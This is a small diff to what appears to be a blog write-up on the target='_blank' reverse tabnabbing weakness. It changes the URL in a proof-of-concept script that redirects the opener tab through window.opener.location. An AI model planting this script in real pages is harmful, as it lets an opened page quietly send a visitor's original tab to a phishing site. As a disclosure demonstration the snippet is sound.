@@ -24,7 +24,7 @@ The exploit itself is very simple. The PoC I used is as follows:
 ```
 <script>
 	if (window.opener) {
-		window.opener.location = "https://spencerdodd.github.io/spencerdodd.github.io/targetblankd/";
+		window.opener.location = "https://spencerdodd.github.io/pocs/targetblankd/";
 	}
 </script>
 ```
